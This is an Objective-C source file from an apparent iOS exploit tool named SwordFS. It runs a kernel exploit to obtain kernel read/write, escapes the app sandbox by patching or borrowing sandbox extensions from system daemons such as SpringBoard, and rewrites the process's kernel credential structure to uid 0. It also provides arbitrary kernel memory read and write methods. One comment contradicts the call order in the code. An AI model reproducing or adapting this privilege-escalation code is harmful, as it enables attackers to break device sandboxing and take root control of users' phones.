//
//  SwordFSBridge.m
//  SwordFS
//

#import "SwordFSBridge.h"

#import "../Exploit/LogTextView.h"
#import "../Exploit/kexploit/kexploit_opa334.h"
#import "../Exploit/kexploit/krw.h"
#import "../Exploit/kexploit/kutils.h"
#import "../Exploit/kexploit/offsets.h"
#import "../Exploit/utils/sandbox.h"
#import "../Exploit/research/sandbox_research.h"

#import <unistd.h>
#import <pthread.h>

// ucred layout (see bsd/sys/ucred.h, verified against off_ucred_cr_label = 0x78)
#define UCRED_CR_UID        0x18
#define UCRED_CR_RUID       0x1c
#define UCRED_CR_SVUID      0x20
#define UCRED_CR_NGROUPS    0x24
#define UCRED_CR_GROUPS     0x28
#define UCRED_CR_RGID       0x68
#define UCRED_CR_SVGID      0x6c

extern uint64_t g_kernel_base;
extern uint64_t g_kernel_slide;
extern int check_sandbox_var_rw(void);
extern int patch_sandbox_ext(void);
extern int borrow_sandbox_ext(const char *process);

static void sword_log_bridge(const char *line, void *context) {
    SwordFSBridge *bridge = (__bridge SwordFSBridge *)context;
    SwordLogHandler handler = bridge.logHandler;
    if (!handler) return;
    NSString *string = [NSString stringWithUTF8String:line] ?: @"";
    handler(string);
}

@interface SwordFSBridge ()
@property (atomic, readwrite) SwordExploitState state;
@property (atomic, readwrite) BOOL rootAchieved;
@property (atomic, readwrite) BOOL sandboxEscaped;
@property (atomic, readwrite) uint64_t kernelBase;
@property (atomic, readwrite) uint64_t kernelSlide;
@end

@implementation SwordFSBridge

+ (SwordFSBridge *)shared {
    static SwordFSBridge *shared = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        shared = [SwordFSBridge new];
    });
    return shared;
}

- (instancetype)init {
    self = [super init];
    if (self) {
        log_init();
        log_set_hook(sword_log_bridge, (__bridge void *)self);
    }
    return self;
}

- (void)runExploitWithCompletion:
    (void (^)(BOOL success, NSString *message))completion {
    if (self.state == SwordExploitStateRunning) return;
    self.state = SwordExploitStateRunning;

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            // Blocks until kernel read/write is stable.
            int result = kexploit_opa334();
            printf("[i] bridge: kexploit_opa334 returned %d\n", result);
            fflush(stdout);

            if (result != 0) {
                dispatch_async(dispatch_get_main_queue(), ^{
                    self.state = SwordExploitStateFailed;
                    completion(NO, @"kernel exploit did not reach r/w - see log");
                });
                return;
            }

            [self applyRootAndSandbox];
            fflush(stdout);

            // applyRootAndSandbox refuses to run in SwordExploitStateRunning,
            // so force the state machine forward before calling it.
            dispatch_async(dispatch_get_main_queue(), ^{
                self.state = SwordExploitStateReady;
                completion(YES, [NSString stringWithFormat:
                    @"kernel r/w @ 0x%llx (slide 0x%llx), uid=%u, sandbox %@",
                    self.kernelBase, self.kernelSlide, getuid(),
                    self.sandboxEscaped ? @"escaped" : @"still active"]);
            });
        }
    });
}

- (BOOL)applyRootAndSandbox {
    if (self.state == SwordExploitStateIdle) {
        return NO;
    }

    // 1. Sandbox: rewrite our own container extension into a scoped read/write
    //    extension rooted at "/". Falls back to borrowing an extension set from
    //    a privileged daemon if the in-place patch does not verify.
    printf("[i] stage 1: sandbox patch\n");
    fflush(stdout);
    BOOL sandboxOK = (patch_sandbox_ext() == 0);
    printf("[i] stage 1: patch_sandbox_ext -> %d\n", sandboxOK);
    if (!sandboxOK || check_sandbox_var_rw() != 0) {
        borrow_sandbox_ext("sysdiagnosed");
        sandboxOK = (check_sandbox_var_rw() == 0);
    }
    if (!sandboxOK) {
        borrow_sandbox_ext("SpringBoard");
        sandboxOK = (check_sandbox_var_rw() == 0);
    }
    self.sandboxEscaped = sandboxOK;
    printf("[i] stage 1: sandbox escaped=%d\n", sandboxOK);
    fflush(stdout);

    // 2. Credentials: patch our own ucred to uid/gid 0.
    printf("[i] stage 2: patching ucred\n");
    fflush(stdout);
    uint64_t proc = proc_self();
    printf("[i] ucred: self proc=0x%llx\n", proc);
    if (proc) {
        uint64_t proc_ro = kread64(proc + off_proc_p_proc_ro);
        printf("[i] ucred: proc_ro=0x%llx\n", proc_ro);
        if (is_kaddr_valid(proc_ro)) {
            uint64_t ucred = kread64(proc_ro + off_proc_ro_p_ucred);
            printf("[i] ucred: ucred=0x%llx\n", ucred);
            if (is_kaddr_valid(ucred)) {
                printf("[i] ucred: before uid=%u ruid=%u svuid=%u gid=%u svgid=%u label=0x%llx\n",
                       kread32(ucred + UCRED_CR_UID), kread32(ucred + UCRED_CR_RUID),
                       kread32(ucred + UCRED_CR_SVUID), kread32(ucred + UCRED_CR_RGID),
                       kread32(ucred + UCRED_CR_SVGID),
                       kread64(ucred + off_ucred_cr_label));
                kwrite32(ucred + UCRED_CR_UID, 0);
                kwrite32(ucred + UCRED_CR_RUID, 0);
                kwrite32(ucred + UCRED_CR_SVUID, 0);
                kwrite16(ucred + UCRED_CR_NGROUPS, 1);
                kwrite32(ucred + UCRED_CR_GROUPS, 0);
                kwrite32(ucred + UCRED_CR_RGID, 0);
                kwrite32(ucred + UCRED_CR_SVGID, 0);
                printf("[i] ucred: patched, uid now %u\n", getuid());
            }
        } else {
            printf("[-] ucred: proc_ro invalid\n");
        }
    }
    self.rootAchieved = (getuid() == 0);

    self.kernelBase = g_kernel_base;
    self.kernelSlide = g_kernel_slide;
    return sandboxOK || self.rootAchieved;
}

- (int)sandboxCheckReadWrite:(NSString *)path {
    pid_t pid = getpid();
    int r = sandbox_check(pid, "file-read-data",
                          SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
                          path.UTF8String);
    int w = sandbox_check(pid, "file-write-data",
                          SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
                          path.UTF8String);
    return (r == 0 && w == 0) ? 0 : -1;
}

- (uint64_t)selfProc {
    if (self.state == SwordExploitStateIdle) return 0;
    return proc_self();
}

- (BOOL)readKernel:(uint64_t)address into:(void *)buffer length:(size_t)length {
    if (!is_kaddr_valid(address) || buffer == NULL || length == 0) return NO;
    kreadbuf(address, buffer, length);
    return YES;
}

- (BOOL)writeKernel:(uint64_t)address from:(const void *)buffer length:(size_t)length {
    if (!is_kaddr_valid(address) || buffer == NULL || length == 0) return NO;
    kwritebuf(address, buffer, length);
    return YES;
}

@end
